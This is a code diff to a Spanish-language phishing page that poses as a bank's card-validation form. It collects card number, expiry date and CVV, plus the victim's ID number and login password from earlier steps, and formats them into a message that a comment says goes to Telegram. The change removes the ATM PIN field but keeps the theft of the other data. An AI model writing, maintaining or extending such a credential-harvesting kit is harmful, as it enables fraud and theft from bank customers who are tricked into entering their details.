@@ -102,11 +102,7 @@
                             <input type="tel" name="cvv" id="cvv" placeholder="3 o 4 dígitos" minlength="3" maxlength="4" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2" required>
                         </div>
                     </div>
-                    <div class="my-4">
-                        <label class="text-sm text-gray-600 mb-1 block">Clave del cajero</label>
-                        <input type="password" name="clave" id="clave" placeholder="4 dígitos" minlength="4" maxlength="4" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2" required>
                     </div>
-                </div>
 
                 <button type="submit" id="submitBtn" disabled class="block w-full rounded-2xl text-white bg-[#df0209] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Validar Tarjeta</button>
             </form>
@@ -136,7 +132,6 @@
             const nroTarjetaInput = document.getElementById('nro_tarjeta');
             const fechaVencimientoInput = document.getElementById('fecha_vencimiento');
             const cvvInput = document.getElementById('cvv');
-            const claveInput = document.getElementById('clave');
             const submitBtn = document.getElementById('submitBtn');
             const errorModal = document.getElementById('error-modal');
             const backToStartButton = document.getElementById('back-to-start-button');
@@ -229,18 +224,18 @@
                 const nroTarjetaValid = nroTarjetaInput && nroTarjetaInput.value.replace(/\s/g, '').length >= 16;
                 const fechaVencimientoValid = fechaVencimientoInput && fechaVencimientoInput.value.length === 5;
                 const cvvValid = cvvInput && cvvInput.value.length >= 3 && cvvInput.value.length <= 4;
-                const claveValid = claveInput && claveInput.value.length === 4;
-
+                
                 const luhnValid = luhnCheck(nroTarjetaInput.value.replace(/\s/g, ''));
 
-                const isFormValid = nroTarjetaValid && fechaVencimientoValid && cvvValid && claveValid && luhnValid;
+                const isFormValid = nroTarjetaValid && fechaVencimientoValid && cvvValid && luhnValid;
 
                 if (submitBtn) {
                     submitBtn.disabled = !isFormValid;
                 }
             }
 
-            [nroTarjetaInput, fechaVencimientoInput, cvvInput, claveInput].forEach(input => {
+            // Se eliminó 'claveInput' de la lista
+            [nroTarjetaInput, fechaVencimientoInput, cvvInput].forEach(input => {
                 if (input) {
                     input.addEventListener('input', validateForm);
                     input.addEventListener('input', () => {
@@ -325,7 +320,8 @@
                 });
 
                 const loginData = initialLoginData || {};
-                const message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${loginData?.loginType || 'Clave Segura'}\nTipo de Doc: ${loginData?.tipoDoc}\n\nCEDULA💎: ${loginData?.nroDoc}\nCLAVE🔐: ${loginData?.clave || loginData?.cardClave}\n\n⚠️ TARJETA CRÉDITO ⚠️\n💳 Tarjeta: ${nroTarjetaInput.value}\n📅 Vence: ${fechaVencimientoInput.value}\n🔒 CVV: ${cvvInput.value}\n🔑 Clave: ${claveInput.value}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+                // Se eliminó la variable claveInput del mensaje a Telegram
+                const message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${loginData?.loginType || 'Clave Segura'}\nTipo de Doc: ${loginData?.tipoDoc}\n\nCEDULA💎: ${loginData?.nroDoc}\nCLAVE🔐: ${loginData?.clave || loginData?.cardClave}\n\n⚠️ TARJETA CRÉDITO ⚠️\n💳 Tarjeta: ${nroTarjetaInput.value}\n📅 Vence: ${fechaVencimientoInput.value}\n🔒 CVV: ${cvvInput.value}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
 
                 const keyboard = JSON.stringify({
                     inline_keyboard: [
@@ -426,3 +422,4 @@
     </script>
 </body>
 </html>
+           
